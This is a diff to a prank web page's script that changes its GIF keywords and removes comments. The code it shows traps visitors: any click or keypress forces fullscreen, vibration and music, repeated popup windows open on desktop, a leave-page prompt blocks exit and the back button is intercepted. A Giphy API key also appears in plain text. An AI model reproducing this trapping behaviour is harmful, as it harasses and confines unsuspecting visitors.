@@ -92,14 +92,12 @@
         const fullscreenContent = document.getElementById('fullscreenContent');
         const bgMusic = document.getElementById('bgMusic');
 
-        // Array of keywords for searching GIFs via Giphy API
         const gifKeywords = [
-            'funny', 'cat', 'dog', 'dance', 'party', 'happy', 'cute', 'lol', 
-            'awesome', 'cool', 'wow', 'yes', 'no', 'omg', 'wtf', 'why',
-            'music', 'food', 'nature', 'technology', 'art', 'science', 'sports'
+            'glitch', 'surreal', 'abstract', 'psychedelic', 'trippy', 'weird', 'strange art', 'unexplained', 'anomaly', 'cosmic horror',
+            'eldritch', 'fractal', 'kaleidoscope', 'subconscious', 'distorted', 'melting', 'void', 'liminal space', 'interdimensional', 'bioluminescent',
+            'geometric patterns', 'hypnotic', 'optical illusion', 'vaporwave', 'synthwave', 'robot dance', 'toaster explosion', 'chaos', 'entropy', 'quantum foam'
         ];
 
-        // Your Giphy API key (replace with your own if necessary)
         const GIPHY_API_KEY = 'GlVGYHkr3WSBnllca54iNt0yFbjz7L65';
 
         function generateRandomColor() {
@@ -111,7 +109,6 @@
             return color;
         }
 
-        // Function to get a random GIF via Giphy API
         async function getRandomGif() {
             try {
                 const randomKeyword = gifKeywords[Math.floor(Math.random() * gifKeywords.length)];
@@ -120,13 +117,11 @@
                 return data.data.images.fixed_height.url;
             } catch (error) {
                 console.error('Error fetching GIF:', error);
-                // Return a fallback static image
                 const randomSeed = Math.random().toString(36).substring(2, 15);
                 return `https://picsum.photos/seed/${randomSeed}/200/200.jpg`;
             }
         }
 
-        // Function to load a local GIF (if any)
         function getLocalGif(index) {
             return `assets/local-gif-${index}.gif`;
         }
@@ -140,9 +135,8 @@
             const numberOfImages = 8;
             const gifPromises = [];
 
-            // Preload exactly 8 GIF URLs
             for (let i = 0; i < numberOfGifs; i++) {
-                const useLocalGif = Math.random() > 0.7; // 30% chance to use a local GIF
+                const useLocalGif = Math.random() > 0.7;
                 
                 if (useLocalGif) {
                     gifPromises.push(Promise.resolve(getLocalGif(i % 5 + 1)));
@@ -154,7 +148,6 @@
             try {
                 const gifUrls = await Promise.all(gifPromises);
                 
-                // Create and add 8 GIFs to the button
                 for (let i = 0; i < numberOfGifs; i++) {
                     const randomWidth = Math.floor(Math.random() * 150) + 50;
                     const randomHeight = Math.floor(Math.random() * 150) + 50;
@@ -180,7 +173,6 @@
                     mainButton.appendChild(img);
                 }
 
-                // Create and add 8 static images to the button
                 for (let i = 0; i < numberOfImages; i++) {
                     const randomWidth = Math.floor(Math.random() * 150) + 50;
                     const randomHeight = Math.floor(Math.random() * 150) + 50;
@@ -203,7 +195,6 @@
 
             } catch (error) {
                 console.error('Error setting button content:', error);
-                // Fallback: fill with 16 static images if something goes wrong
                 for (let i = 0; i < 16; i++) {
                     const img = document.createElement('img');
                     img.classList.add('random-image');
@@ -256,7 +247,7 @@
             });
 
             window.addEventListener('beforeunload', function (e) {
-                const message = "ВНИМАНИЕ: Все несохраненные данные и прогресс будут безвозвратно утеряны. Вы точно хотите покинуть страницу?";
+                const message = "?";
                 e.preventDefault();
                 e.returnValue = message;
                 return message;
@@ -278,23 +269,20 @@
         }
 
         function triggerFullScreen() {
-            // Add vibration for 2 seconds if the API is supported
             if ('vibrate' in navigator) {
-                navigator.vibrate(2000); // 2000 milliseconds = 2 seconds
+                navigator.vibrate(0);
+                navigator.vibrate(2000);
             }
 
-            // For desktop, open the first popup immediately.
             if (!isMobileDevice) {
                 window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
             }
 
-            // Then, proceed with fullscreen and music for all users.
             startSession();
             requestFullScreenMode();
             fullscreenContent.style.display = 'block';
             bgMusic.play();
             
-            // For mobile devices, handle the back button.
             if (isMobileDevice) {
                 document.addEventListener('backbutton', function(e) {
                     e.preventDefault();
@@ -306,14 +294,12 @@
             }
         }
 
-        // Listener for clicks on the fullscreen background (desktop only)
         fullscreenContent.addEventListener('click', function() {
             if (!isMobileDevice) {
                 window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
             }
         });
         
-        // Listener for fullscreen state changes (e.g., pressing Escape on desktop)
         document.addEventListener('fullscreenchange', function() {
             if (!document.fullscreenElement && fullscreenContent.style.display === 'block') {
                 if (!isMobileDevice) {
@@ -324,8 +310,6 @@
 
         setRandomButtonContent();
         mainButton.addEventListener('click', triggerFullScreen);
-
-        // Add keyboard event listener to trigger to same action
         document.addEventListener('keydown', triggerFullScreen);
     </script>
 </body>
